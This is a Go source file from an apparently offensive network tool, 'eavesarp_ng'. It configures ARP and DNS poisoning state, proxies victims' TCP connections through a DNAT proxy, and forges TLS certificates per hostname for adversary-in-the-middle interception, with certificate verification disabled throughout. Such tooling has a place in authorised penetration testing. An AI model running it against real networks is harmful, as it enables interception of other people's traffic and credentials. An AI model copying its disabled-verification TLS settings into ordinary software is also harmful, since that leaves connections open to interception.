package eavesarp_ng

import (
	"context"
	"crypto/tls"
	"crypto/x509/pkix"
	"database/sql"
	"errors"
	"fmt"
	gs "github.com/impostorkeanu/gosplit"
	"go.uber.org/zap"
	_ "modernc.org/sqlite"
	"net"
	"slices"
	"sync"
	"sync/atomic"
	"time"
)

const (
	DefaultDownstreamOptWeight int = iota
	DefaultTCPServerOptWeight
	DefaultProxyServerOptWeight

	TCPConntrackTransport ConntrackTransport = "tcp"
	UDPConntrackTransport ConntrackTransport = "udp"
)

var (
	dsTLSCfg = &tls.Config{
		InsecureSkipVerify: true,
	}
)

type (
	Cfg struct {
		db     *sql.DB
		ipNet  *net.IPNet
		iface  *net.Interface
		log    *zap.Logger
		errC   chan error // Channel to communicate errors to other applications
		arp    arpCfgFields
		dns    dnsCfgFields
		tls    tlsCfgFields
		aitm   aitmCfgFields
		cancel context.CancelFunc
	}

	// arpCfgFields defines configuration fields related to ARP.
	arpCfgFields struct {
		ch     chan SendArpCfg     // channel used to initiate arp requests
		active *LockMap[ActiveArp] // active arp requests
	}

	// dnsCfgFields defines configuration fields related to DNS.
	dnsCfgFields struct {
		ch        chan DoDnsCfg      // channel used to initiate dns queries
		active    *LockMap[DoDnsCfg] // active dns queries
		failCount *FailCounter       // count of failed dns queries
	}

	// tlsCfgFields defines configuration fields related to TLS.
	tlsCfgFields struct {
		cache  *TLSCertCache
		keygen *gs.RSAPrivKeyGenerator // private key generator
	}

	// aitmCfgFields defines configuration fields related to AITM.
	aitmCfgFields struct {
		// connAddrs maps the sender address to a target address for a connection
		// that has been detected by netfilter.
		connAddrs *sync.Map

		// downstreams maps the sender IP of an AITM attack to a downstream
		// that will receive proxied connections, allowing us to use a single
		// ProxyServer listening on a local port for multiple downstreams.
		//downstreams *LockMap[proxyDownstream]

		// defDownstream describes a TCP listener that will receive connections
		// during an AITM attack that _without_ an AITM target. This allows us to complete
		// the TCP connection and receive TCP segments even when an attack is not
		// configured with a downstream.
		defDownstream atomic.Value
	}

	// ConntrackTransport indicates the transport protocol of the
	// connection. See TCPConntrackTransport and UDPConntrackTransport.
	ConntrackTransport string

	// ConntrackInfo contains information related to a poisoned connection
	// that's being proxied through Eavesarp.
	ConntrackInfo struct {
		IP        string             `json:"ip,omitempty"`
		Port      string             `json:"port,omitempty"`
		Transport ConntrackTransport `json:"transport,omitempty"`
	}

	// DefaultProxyServerAddrOpt sets the default TCP proxy for poisoned
	// connections.
	//
	// When supplied to NewCfg and empty, a TCP listener will be started
	// on a randomly available port on cfg.iface.
	DefaultProxyServerAddrOpt string

	// DefaultDownstreamOpt sets the default downstream for AITM attacks.
	//
	// When not supplied or empty, the server specified by DefaultTCPServerOpts
	// will become the default.
	DefaultDownstreamOpt string
)

func (cfg *Cfg) Err() <-chan error {
	return cfg.errC
}

// NewCfg creates a Cfg for various eavesarp_ng functions.
//
// dsn is the Data Source Name describing where to find the SQLite database. The
// database is initialized along with Cfg.
//
// ifaceName and ifaceAddr describe the network interface to monitor,
// the latter of which can be empty (""), indicating that the first non-loopback
// address should be used.
//
// log enables logging. See NewLogger.
//
// # Options
//
// - DefaultTCPServerOpts
// - DefaultProxyServerAddrOpt
// - DefaultDownstreamOpt
func NewCfg(dsn string, ifaceName, ifaceAddr string, log *zap.Logger, opts ...any) (cfg Cfg, err error) {

	if log == nil {
		err = errors.New("nil logger")
		return
	}
	cfg.log = log

	//==========================
	// VALIDATE AND SORT OPTIONS
	//==========================

	for _, opt := range opts {
		if _, err = optInt(opt); err != nil {
			return
		}
	}
	slices.SortFunc(opts, func(a, b any) int {
		aI, _ := optInt(a)
		bI, _ := optInt(b)
		return aI - bI
	})

	//=============================
	// INITIALIZE CHANNELS AND MAPS
	//=============================

	cfg.errC = make(chan error, 1) // channel to communicate errors
	if err = cfg.getInterface(ifaceName, ifaceAddr); err != nil {
		return
	}

	cfg.dns.ch = make(chan DoDnsCfg, 50)
	cfg.dns.active = NewLockMap(make(map[string]*DoDnsCfg))

	cfg.arp.ch = make(chan SendArpCfg, 50)
	cfg.arp.active = NewLockMap(make(map[string]*ActiveArp))

	cfg.db, err = cfg.initDb(dsn)
	cfg.dns.failCount = NewFailCounter(DnsMaxFailures)

	cfg.aitm.connAddrs = new(sync.Map)

	//==========================
	// START SUPPORTING ROUTINES
	//==========================

	var ctx context.Context
	ctx, cfg.cancel = context.WithCancel(context.Background())

	// TLS private key generation and certificate caching
	cfg.tls = tlsCfgFields{
		cache:  &TLSCertCache{cfg: cfg},
		keygen: &gs.RSAPrivKeyGenerator{},
	}
	if err = cfg.tls.keygen.Start(2048); err != nil {
		return
	}

	for _, opt := range opts {
		switch v := opt.(type) {
		// TODO add a case to handle a default UDP server to log data
		case DefaultTCPServerOpts:
			// Generate a random certificate for TLS connections
			if v.TLSCfg == nil {
				var crt *tls.Certificate
				crt, err = gs.GenSelfSignedCert(pkix.Name{}, nil, nil, cfg.tls.keygen.Generate())
				if err != nil {
					cfg.log.Error("error generating self signed certificate for default tcp server", zap.Error(err))
					return
				}
				v.TLSCfg = &tls.Config{
					InsecureSkipVerify: true,
					Certificates:       []tls.Certificate{*crt},
				}
			}

			// TCP server to complete connections when no downstream
			// is configured for a poisoning attack
			err = cfg.StartDefaultTCPServer(ctx, &v)

			if cfg.aitm.getDefaultDS() != nil {
				continue
			}

			if defA, defP, e := net.SplitHostPort(v.Addr); err != nil {
				cfg.log.Error("error parsing default tcp server", zap.Error(err))
				err = e
				return
			} else {
				cfg.aitm.setDefaultDS(ConntrackInfo{IP: defA, Port: defP, Transport: TCPConntrackTransport})
			}

		case DefaultProxyServerAddrOpt:
			// Proxy server that will be used to proxy connections to
			// downstreams
			err = cfg.StartDefaultProxy(ctx, string(v))

		case DefaultDownstreamOpt:
			// Default downstream IP address that will receive all
			// TCP connections
			x := ConntrackInfo{Transport: TCPConntrackTransport}
			x.IP, x.Port, err = net.SplitHostPort(string(v))
			if err != nil {
				err = fmt.Errorf("failed to parse default downstream value: %w", err)
			} else {
				cfg.aitm.setDefaultDS(x)
			}
		}
	}

	return
}

// startRandListener starts a tcp4 listener on addr. l is bound to a random localhost
// port if addr is empty.
func (cfg *Cfg) startRandListener(addr string) (l net.Listener, err error) {
	if cfg.ipNet == nil {
		err = errors.New("nil ipNet")
		return
	}
	if addr == "" {
		addr = net.JoinHostPort(cfg.ipNet.IP.String(), "0")
	}
	l, err = net.Listen("tcp4", addr)
	return
}

// StartDefaultProxy runs a proxy server in a distinct routine that will receive
// all proxied connections via DNAT.
func (cfg *Cfg) StartDefaultProxy(ctx context.Context, addr string) (err error) {
	var l net.Listener
	if l, err = cfg.startRandListener(addr); err != nil {
		return
	}
	cfg.log.Info("default tcp proxy server listener started", zap.String("address", addr))
	go func() {
		cfg.log.Debug("default tcp proxy server accepting connections", zap.String("address", l.Addr().String()))
		if e := gs.NewProxyServer(cfg, l).Serve(ctx); e != nil {
			cfg.log.Error("default tcp proxy server failed", zap.Error(e))
			cfg.errC <- err
		}
	}()
	return
}

// StartDefaultTCPServer starts a TLS aware TCP server that will proxy incoming connections
// from victims of spoofing attacks that do not have a downstream configured. This ensures
//  that all TCP connections can complete and send packets.
func (cfg *Cfg) StartDefaultTCPServer(ctx context.Context, opts *DefaultTCPServerOpts) (err error) {
	var l net.Listener
	if l, err = cfg.startRandListener(opts.Addr); err != nil {
		return
	}

	opts.Addr = l.Addr().String()
	cfg.log.Info("default tcp server listener started", zap.String("address", opts.Addr))

	go func() {
		cfg.log.Debug("default tcp server accepting connections", zap.String("address", opts.Addr))
		if e := ServeTCP(ctx, cfg, l, *opts); e != nil {
			cfg.log.Error("default tcp server error", zap.Error(e))
			cfg.errC <- e
		}
	}()

	return
}

// DB returns the database connection initialized by NewCfg.
func (cfg *Cfg) DB() *sql.DB {
	return cfg.db
}

func (cfg *Cfg) Shutdown() {
	// TODO clear nft table
	cfg.cancel()
	if cfg.db != nil {
		cfg.db.Close()
	}
	if cfg.tls.keygen != nil {
		cfg.tls.keygen.Stop()
	}
	close(cfg.arp.ch)
	close(cfg.dns.ch)
	close(cfg.errC)
}

func (cfg *Cfg) initDb(dsn string) (db *sql.DB, err error) {
	db, err = sql.Open("sqlite", dsn)
	if err != nil {
		cfg.log.Error("error opening db", zap.Error(err))
		return
	}
	db.SetMaxOpenConns(1)
	// TODO test the connection by pinging the database
	_, err = db.ExecContext(context.Background(), SchemaSql)
	if err != nil {
		cfg.log.Error("error while applying database schema", zap.Error(err))
		return
	}
	return
}

// getInterface gets the network interface described by name and addr.
//
// addr is optional (can be empty) and is used to specify which address
// to listen for when multiple IPv4 addresses are assigned to the interface.
func (cfg *Cfg) getInterface(name string, addr string) (err error) {

	var iAddr net.IP
	if addr != "" {
		if iAddr = net.ParseIP(addr); iAddr == nil {
			err = errors.New("invalid addr")
			return
		}
	}

	cfg.iface, err = net.InterfaceByName(name)
	if err != nil {
		cfg.log.Error("error looking up network interface", zap.Error(err))
		return
	}

	var addrs []net.Addr
	addrs, err = cfg.iface.Addrs()
	if err != nil {
		cfg.log.Error("failed to obtain ip address from network interface", zap.Error(err))
		return
	} else {
		for _, a := range addrs {
			if n, ok := a.(*net.IPNet); ok && !n.IP.IsLoopback() {
				if ip4 := n.IP.To4(); ip4 != nil {
					if addr != "" && ip4.String() != addr {
						continue
					}
					cfg.ipNet = &net.IPNet{
						IP:   ip4,
						Mask: n.Mask[len(n.Mask)-4:],
					}
				}
			}
		}
	}

	if cfg.ipNet == nil {
		cfg.log.Warn("failed to find network interface", zap.String("ifaceName", name))
		if addr != "" {
			err = fmt.Errorf("failed to find ip (%v) bound to interface (%v)", addr, name)
			cfg.log.Error("error looking up network interface", zap.Error(err))
		}
	}

	return
}

func (cfg *Cfg) GetProxyCertificateFunc(downstreamIP string) func(h *tls.ClientHelloInfo) (cert *tls.Certificate, error error) {

	return func(h *tls.ClientHelloInfo) (cert *tls.Certificate, err error) {

		var ips, dnsNames []string
		var cn string
		if h.ServerName != "" {
			// common name is server name when set
			cn = h.ServerName
			ips = append(ips, downstreamIP)
		} else {
			cn = downstreamIP
		}

		// TODO query dns names for target from database and add to dnsNames

		// create cache key
		k, err := NewCertCacheKey(cn, ips, dnsNames)
		if err != nil {
			cfg.log.Error("error getting cert cache key", zap.Error(err))
			return
		}

		// get a cached certificate
		cert, err = cfg.tls.cache.Get(k)
		if err != nil {
			cfg.log.Error("error getting cached certificate", zap.Error(err))
			return
		}

		return

	}

}

// getDefaultDS gets the default downstream.
func (f *aitmCfgFields) getDefaultDS() (a *ConntrackInfo) {
	a, _ = f.defDownstream.Load().(*ConntrackInfo)
	return
}

// setDefaultDS sets the default downstream.
func (f *aitmCfgFields) setDefaultDS(a ConntrackInfo) {
	f.defDownstream.Store(&a)
}

//==========================
// GoSplit INTERFACE METHODS
//==========================

//func (cfg *Cfg) RecvVictimData(i gs.ConnInfo, b []byte) {
//	//TODO implement me
//	panic("implement me")
//}
//
//func (cfg *Cfg) RecvDownstreamData(i gs.ConnInfo, b []byte) {
//	//TODO implement me
//	panic("implement me")
//}

// RecvConnStart to implement gosplit.ConnInfoReceiver.
func (cfg *Cfg) RecvConnStart(i gs.ConnInfo) {
	cfg.log.Debug("new connection started", zap.Any("conn", i))
}

// RecvConnEnd to implement gosplit.ConnInfoReceiver
//
// This removes the cfg.connAddrs entry for the current connection.
func (cfg *Cfg) RecvConnEnd(i gs.ConnInfo) {
	cfg.log.Debug("connection ended", zap.Any("conn", i))
	cfg.aitm.connAddrs.Delete(gs.Addr{
		IP:   i.VictimAddr.IP,
		Port: i.VictimAddr.Port,
	})
}

func (cfg *Cfg) RecvLog(r gs.LogRecord) {
	cfg.log.Info("received log event from tcp proxy", zap.Any("record", r))
}

func (cfg *Cfg) GetProxyTLSConfig(_ gs.ProxyAddr, _ gs.VictimAddr, dsA gs.DownstreamAddr) (*tls.Config, error) {
	return &tls.Config{
		InsecureSkipVerify: true,
		GetCertificate:     cfg.GetProxyCertificateFunc(dsA.IP),
	}, nil
}

func (cfg *Cfg) GetDownstreamAddr(_ gs.ProxyAddr, vicA gs.VictimAddr) (ip string, port string, err error) {
	// try to retrieve downstream connection a few times
	for i := 0; i < 10; i++ {
		if ds, ok := cfg.aitm.connAddrs.Load(ConntrackInfo{IP: vicA.IP, Port: vicA.Port, Transport: TCPConntrackTransport}); ok {
			ip, port = ds.(ConntrackInfo).IP, ds.(ConntrackInfo).Port
			return
		}
		time.Sleep(10 * time.Millisecond)
	}
	err = fmt.Errorf("victim ip (%s) has no downstream set", vicA.IP)
	return
}

func (cfg *Cfg) GetDownstreamTLSConfig(_ gs.ProxyAddr, _ gs.VictimAddr, _ gs.DownstreamAddr) (*tls.Config, error) {
	return dsTLSCfg, nil
}
